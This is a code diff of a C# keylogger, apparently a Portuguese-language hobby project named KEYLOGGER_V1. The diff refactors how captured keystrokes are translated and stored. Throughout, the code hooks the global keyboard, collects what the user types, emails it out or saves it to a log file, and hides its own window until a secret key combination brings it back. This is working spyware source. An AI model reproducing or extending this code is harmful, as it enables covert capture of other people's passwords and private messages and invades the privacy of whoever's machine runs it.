@@ -11,6 +11,7 @@ namespace KEYLOGGER_V1
     {
         int conta;
         string[] names = new string[3];
+        Mapeamento map = new Mapeamento();
         
         //istanciar Class Caputura de Teclas
         globalKeyboardHook gkh = new globalKeyboardHook();
@@ -24,8 +25,13 @@ namespace KEYLOGGER_V1
 
         void gkh_KeyDown(object sender, KeyEventArgs e)
         {
-            txtTextoDigitado.Text += GerenciamentoDeCaracteres(Convert.ToString(e.KeyCode));
+            Tecla tecla ;
+            tecla = map.mapeamento(Convert.ToString(e.KeyCode));
+            txtNaoTraduzido.Text += tecla.naotraduizada;
+            txtTraduzido.Text += tecla.traduzida;
+            txtEditado.Text += tecla.editada;
         }
+
         public FrmHome()
         {
             InitializeComponent();
@@ -132,7 +138,7 @@ namespace KEYLOGGER_V1
                 cliente.Send(Email);
             }
             //MessageBox.Show("Email enviado com sucesso!!", "Email - Enviado!");
-            txtTextoDigitado.Clear();
+            txtNaoTraduzido.Clear();
 
         }
         void EnviarEmailBackup(String DirBackup)
@@ -159,9 +165,9 @@ namespace KEYLOGGER_V1
         {
 
             StreamWriter SW = new StreamWriter(DirBackup, true);
-            SW.Write(txtTextoDigitado.Text);
+            SW.Write(txtNaoTraduzido.Text);
             SW.Close();
-            txtTextoDigitado.Clear();
+            txtNaoTraduzido.Clear();
            // MessageBox.Show("Criado backup com sucesso!");
         }
         void BackupOrEmail()
@@ -169,9 +175,9 @@ namespace KEYLOGGER_V1
 
             if (Habilitar_web() == true)
             {
-                if (txtTextoDigitado.Text != "")
+                if (txtNaoTraduzido.Text != "")
                 {
-                    EnviarEmail(txtTextoDigitado.Text);
+                    EnviarEmail(txtNaoTraduzido.Text);
                 }
 
 
@@ -185,270 +191,22 @@ namespace KEYLOGGER_V1
         }
         private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
         {
-            File.Delete(@"C:\Key\Keylogger.txt");
-            if (txtTextoDigitado.Text != ""){
-                criarBackup(@"C:\Key\Keylogger.txt");
-            }
+            //File.Delete(@"C:\Key\Keylogger.txt");
+            //if (txtTextoDigitado.Text != ""){
+            //    criarBackup(@"C:\Key\Keylogger.txt");
+            //}
             
         }
-        String GerenciamentoDeCaracteres(String Key)
-        {
-
-            switch (Key)
-            {
-
-                case "LWin":
-
-                    return "[Win]";
-                    break;
-                case "LControlKey":
-
-                    return "[Ctrl]";
-                case "RControlKey":
-
-                    return "[Ctrl]";
-                    break;
-                case "LMenu":
-
-                    return "[Alt]";
-                    break;
-                case "RMenu":
-
-                    return "[Alt]";
-                    break;
-                case "Return":
-
-                    return "[Enter]";
-                    break;
-                case "Space":
-
-                    return "[Space]";
-                    break;
-                case "LShiftKey":
-
-                    return "[Shift]";
-                    break;
-                case "RShiftKey":
-
-                    return "[Shift]";
-                    break;
-                case "Capital":
-
-                    return "[Caps Lock]";
-                    break;
-                case "Tab":
-
-                    return "[Tab]";
-                    break;
-                case "Oemtilde":
-
-                    return "'";
-                    break;
-                case "Escape":
-
-                    return "[Esc]";
-                    break;
-                case "Back":
-
-                    return "[Back]";
-                    break;
-                case "PrintScreen":
-
-                    return "[Print Screen]";
-                    break;
-                case "Pause":
-
-                    return "[Pause Break]";
-                    break;
-                case "Insert":
-
-                    return "[Insert]";
-                    break;
-                case "Delete":
-
-                    return "[Delete]";
-                    break;
-                case "Home":
-
-                    return "[Home]";
-                    break;
-                case "PageUp":
-
-                    return "[Page Up]";
-                    break;
-                case "Next":
-
-                    return "[Page Down]";
-                    break;
-                case "End":
-
-                    return "[End]";
-                    break;
-                case "Apps":
-
-                    return "[Menu]";
-                    break;
-                case "Up":
-
-                    return "[Up]";
-                    break;
-                case "Down":
-
-                    return "[Down]";
-                    break;
-                case "Right":
-
-                    return "[Right]";
-                    break;
-                case "Left":
-
-                    return "[Left]";
-                    break;
-                case "Oemplus":
-
-                    return "=";
-                    break;
-                case "OemMinus":
-
-                    return "-";
-                    break;
-                case "Oem6":
-
-                    return "[";
-                    break;
-                case "Oem5":
-                    return "]";
-                    break;
-                case "Oem7":
-
-                    return "";
-                    break;
-                case "OemOpenBrackets":
-
-                    return "´";
-                    break;
-                case "Oem1":
-
-                    return "Ç";
-                    break;
-                case "Oemcomma":
-
-                    return ",";
-                    break;
-                case "OemPeriod":
-
-                    return ".";
-                    break;
-                case "OemQuestion":
-
-                    return ";";
-                    break;
-                case "D1":
-
-                    return "1";
-                    break;
-                case "D2":
-
-                    return "2";
-                    break;
-                case "D3":
-
-                    return "3";
-                    break;
-                case "D4":
-
-                    return "4";
-                    break;
-                case "D5":
-
-                    return "5";
-                    break;
-                case "D6":
-
-                    return "6";
-                    break;
-                case "D7":
-
-                    return "7";
-                    break;
-                case "D8":
-
-                    return "8";
-                    break;
-                case "D9":
-
-                    return "9";
-                    break;
-                case "D0":
-
-                    return "0";
-                    break;
-                case "F1":
-
-                    return "[F1]";
-                    break;
-                case "F2":
-
-                    return "[F2]";
-                    break;
-                case "F3":
-
-                    return "[F3]";
-                    break;
-                case "F4":
-
-                    return "[F4]";
-                    break;
-                case "F5":
-
-                    return "[F5]";
-                    break;
-                case "F6":
-
-                    return "[F6]";
-                    break;
-                case "F7":
-
-                    return "[F7]";
-                    break;
-                case "F8":
-
-                    return "[F8]";
-                    break;
-                case "F9":
-
-                    return "[F9]";
-                    break;
-                case "F10":
-
-                    return "[F10]";
-                    break;
-                case "F11":
-
-                    return "[F11]";
-                    break;
-                case "F12":
-
-                    return "[F12]";
-                    break;
-
-
-                default:
-
-                    return Key;
-            }
-
-
-        }
+       
         private void FrmHome_KeyPress(object sender, KeyPressEventArgs e)
         {
 
         }
         private void txtTextoDigitado_TextChanged(object sender, EventArgs e)
         {
-            String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento
+           String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento
 
-            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter)
+            if (teclaDeVisibilidade(txtTraduzido.Text, caracter) == caracter)
             {
                 if (this.Opacity == 0 && this.ShowInTaskbar == false)
                 {
@@ -457,8 +215,7 @@ namespace KEYLOGGER_V1
                 }
                 else { 
                     
-                    invisivel(); 
-                                                  
+                    invisivel();                                                  
                 }
             }
         }
@@ -481,6 +238,5 @@ namespace KEYLOGGER_V1
             
 
         }
-
     }
 }
